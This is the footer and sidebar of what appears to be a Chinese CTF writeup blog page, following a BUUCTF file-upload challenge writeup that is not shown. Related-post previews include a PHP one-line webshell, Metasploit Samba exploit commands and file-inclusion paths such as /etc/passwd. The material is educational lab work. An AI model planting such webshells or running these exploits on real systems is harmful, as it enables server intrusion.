+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lengkur.github.io">Lengkur</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lengkur.github.io/2026/05/25/wp/BUUCTF/[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/">https://lengkur.github.io/2026/05/25/wp/BUUCTF/[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lengkur.github.io" target="_blank">Lengkur</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><a class="post-meta__tags" href="/tags/HTTP/">HTTP</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="post-meta__tags" href="/tags/WP/">WP</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a></div><div class="post-share"><div class="social-share" data-image="/img/black.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/05/14/notes/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/" title="内网横向"><img class="cover" src="/img/black.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">内网横向</div></div><div class="info-2"><div class="info-item-1">metasploitSamba(139:445)1msf &gt; search cve:2017-7494  12345msfconsoleuse exploit/linux/samba/is_known_pipenameset rhost 172.2.123.6set RPORT 445e...</div></div></div></a><a class="pagination-related" href="/2026/05/26/wp/BUUCTF/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%5Deasy_tornado/" title="[护网杯 2018]easy_tornado"><img class="cover" src="/img/black.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[护网杯 2018]easy_tornado</div></div><div class="info-2"><div class="info-item-1">123/flag.txt/welcome.txt/hints.txt  一进来就显示了三个文件链接，逐个点击可以看到这些信息 12345678/flag.txtflag in /fllllllllllllag/welcome.txtrender/hints.txtmd5(cookie_secr...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/05/26/wp/BUUCTF/%5BGXYCTF2019%5DBabyUpload/" title="[GXYCTF2019]BabyUpload"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-26</div><div class="info-item-2">[GXYCTF2019]BabyUpload</div></div><div class="info-2"><div class="info-item-1">打开题目就一文件上传点  先上传一个空的png文件试试水，响应文件类型上传的太暴露，改成jpeg变正常，返回了文件路径并可以访问 1/var/www/html/upload/edf5f3dd80e979848bb7f9eb670da2cd/100.png succesfully uploade...</div></div></div></a><a class="pagination-related" href="/2026/01/16/wp/ctfshow/web161-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-.user.ini+%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="web161-文件上传-.user.ini+远程文件包含"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-16</div><div class="info-item-2">web161-文件上传-.user.ini+远程文件包含</div></div><div class="info-2"><div class="info-item-1"> [图片缺失] 原始路径：/home/hack/.config/Typora/typora-user-images/image-20260105182416682.png  1.先上传一个.user.ini配置文件，这要加上GIF89a，这是GIF文件的图片头，以便绕过过滤 12GIF89aa...</div></div></div></a><a class="pagination-related" href="/2026/05/03/notes/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-03</div><div class="info-item-2">文件包含</div></div><div class="info-2"><div class="info-item-1">php伪协议 file:&#x2F;&#x2F;文件路径：例，  1.win：file:&#x2F;&#x2F;C:&#x2F;flag   2.file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd php:&#x2F;&#x2F;filter：例，php:&#x2F;...</div></div></div></a><a class="pagination-related" href="/2026/03/31/wp/XMCTF/AutoPypy/" title="AutoPypy"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-31</div><div class="info-item-2">AutoPypy</div></div><div class="info-2"><div class="info-item-1">prooage-20260329213032767](&#x2F;home&#x2F;hack&#x2F;.config&#x2F;Typora&#x2F;typora-user-images&#x2F;image-20260329213032767.png) 进来简单看一下，可以知道是个文件...</div></div></div></a><a class="pagination-related" href="/2026/01/16/wp/NSSCTF%20WEB/%5BNISACTF%202022%5Dbingdundun~-phar%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-phar%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="[NISACTF 2022]bingdundun~-phar文件上传-phar伪协议"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-16</div><div class="info-item-2">[NISACTF 2022]bingdundun~-phar文件上传-phar伪协议</div></div><div class="info-2"><div class="info-item-1"> 1.点过去，是一个文件上传页面  [图片缺失] 原始路径：/home/hack/.config/Typora/typora-user-images/image-20260113115829613.png  2.这里需要用到phar文件，phar是将多个php文件压缩起来的归档文件，相当于.j...</div></div></div></a><a class="pagination-related" href="/2026/04/30/notes/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-30</div><div class="info-item-2">文件上传</div></div><div class="info-2"><div class="info-item-1">如果一句话木马已经不好传了，可以尝试直接传php语句，执行命令 单语句可以不写分号，如：&lt;? system(‘ls’)?&gt; 一句话木马1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  1&lt;?= @eval($_POST[&#x2...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Lengkur</div><div class="author-info-description">CTF Web / Writeups / Security Notes</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">138</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lengkur"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/lengkur" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:guo374655@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><i class="fas fa-terminal"></i> root@lengkur:~$ share writeups && learn security</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/27/wp/BUUCTF/%5BGXYCTF2019%5DBabySQli/" title="[GXYCTF2019]BabySQli">[GXYCTF2019]BabySQli</a><time datetime="2026-05-27T03:01:43.000Z" title="发表于 2026-05-27 11:01:43">2026-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/26/wp/BUUCTF/%5BGXYCTF2019%5DBabyUpload/" title="[GXYCTF2019]BabyUpload">[GXYCTF2019]BabyUpload</a><time datetime="2026-05-26T12:01:08.000Z" title="发表于 2026-05-26 20:01:08">2026-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/26/wp/BUUCTF/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz/" title="[网鼎杯 2020 青龙组]AreUSerialz">[网鼎杯 2020 青龙组]AreUSerialz</a><time datetime="2026-05-26T07:27:39.000Z" title="发表于 2026-05-26 15:27:39">2026-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/26/wp/BUUCTF/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHardSQL/" title="[极客大挑战 2019]HardSQL">[极客大挑战 2019]HardSQL</a><time datetime="2026-05-26T06:30:52.000Z" title="发表于 2026-05-26 14:30:52">2026-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/26/wp/BUUCTF/%5BZJCTF%202019%5DNiZhuanSiWei/" title="[ZJCTF 2019]NiZhuanSiWei">[ZJCTF 2019]NiZhuanSiWei</a><time datetime="2026-05-26T03:01:28.000Z" title="发表于 2026-05-26 11:01:28">2026-05-26</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Lengkur</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4-b1"></script><script src="/js/main.js?v=5.5.4-b1"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script><script src="/js/universe.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="SQL,Javascript,Flask,HTTP,XSS,SSRF,CSRF,SSTI,Struct2,文件上传,文件包含,信息搜集,PHP,反序列化,XXE,沙盒逃逸,内存马" data-fontsize="20px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
